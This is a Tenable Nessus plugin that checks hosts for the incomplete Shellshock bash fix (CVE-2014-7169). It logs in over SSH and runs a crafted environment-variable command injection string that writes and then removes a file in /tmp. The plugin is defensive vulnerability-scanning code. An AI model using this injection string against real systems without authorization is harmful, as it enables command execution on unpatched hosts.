#TRUSTED 3a78e984efce557b817330f3529cdab5e1bae94a164dc8e17c911d6b527c0937f62d6ba3a2054a212e345847cbbef14ec8dea383e000e8b6f3f34e3a9f9582b82aec867c1cde1cb076bf1b82163392a06ea2d428e6a939dada8896b7bc7057440248d87275c9d427736c107cdefae9c6ab2d3336268617eaf8fc052dcea45788936cda4db56223c103ab6d47a9410a36e3b7c15bb646c66d87330e3753f3faede0a22fde6aacb21015f99b84c71d2bf4257c521a64f15ebff23b6e19a3399149aefd35eca136f7af0da8737d15e7a3a8969bcfc35d3708de346661de14df221a8099e8fafa37c6ad4fc1e91abed990232c4975624e419072b141d9e3d2792180f65d9a123073fc623bbb146216cae7aa2de67b2caaa42144f36ef58d76504d3cb7f06bc3b6d05b32fcf8e6cdf6a32207c6d06dea228d081ab2413873ecf629a1160585fd54f557f7457a051a8760a1d12aac90aaa96cfcd4d9ccc94d4d4e0d6fe184a725e0b94df98a45ce113f1f59807cc91e9fe04bfb3de827098f589647825892b7b00c222557fe850317d8c478dfb05ee26103beb1e1262da7e06222e3c6c783049599fe6cb670fb0ab69e1ae435216342ef9a11dc33c1886a911226771745402792ca8d5ef244f7188c5ceb7dd30e912cc96d359ba8c6bfb35c6161bea0c5b1f537a013b13ae3f95153667727c433d9b7392434ee3cf3299772f3f4a3d5
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(78385);
  script_version("1.7");
  script_set_attribute(attribute:"plugin_modification_date", value:"2016/11/17");

  script_cve_id("CVE-2014-7169");
  script_bugtraq_id(70137);
  script_osvdb_id(112004);
  script_xref(name:"CERT", value:"252743");
  script_xref(name:"IAVA", value:"2014-A-0142");
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"EDB-ID", value:"34766");
  script_xref(name:"EDB-ID", value:"34777");

  script_name(english:"Bash Incomplete Fix Remote Code Execution Vulnerability (Shellshock)");
  script_summary(english:"Logs in with SSH.");

  script_set_attribute(attribute:"synopsis", value:"A system shell on the remote host is vulnerable to command injection.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of Bash that is vulnerable to
command injection via environment variable manipulation. Depending on
the configuration of the system, an attacker can remotely execute
arbitrary code.");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"solution", value:"Apply the appropriate updates.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Pure-FTPd External Authentication Bash Environment Variable Code Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/10/13");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"agent", value:"unix");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("ssh_get_info.nasl");
  script_require_keys("HostLevelChecks/proto");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("ssh_func.inc");
include("telnet_func.inc");
include("hostlevel_funcs.inc");
include("misc_func.inc");

proto = get_kb_item_or_exit('HostLevelChecks/proto');

port = get_service(svc:"ssh", default:22, exit_on_fail:TRUE);
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

if (proto == 'local')
  info_t = INFO_LOCAL;
else if (proto == 'ssh')
{
  info_t = INFO_SSH;
  ret = ssh_open_connection();
  if (!ret) audit(AUDIT_FN_FAIL, 'ssh_open_connection');
}
else
  exit(0, 'This plugin only attempts to run commands locally or via SSH, and neither is available against the remote host.');

command = "cd /tmp && X='() { (a)=>\' bash -c 'echo /usr/bin/id' && cat /tmp/echo && rm /tmp/echo";
output = info_send_cmd(cmd:command);

if (output !~ "uid=[0-9]+.*gid=[0-9]+.*") audit(AUDIT_HOST_NOT, "affected.");

report = NULL;
if (report_verbosity > 0)
{
  report =
    '\n' + 'Nessus was able to exploit a flaw in the patch for CVE-2014-7169' +
    '\n' + 'and write to a file on the target system.' +
    '\n' +
    '\n' + 'File contents :' +
    '\n' +
    '\n' + output +
    '\n' +
    '\n' + 'Note: Nessus has attempted to remove the file from the /tmp directory.\n';
  security_hole(port:port, extra:report);
}
else security_hole(port:port);
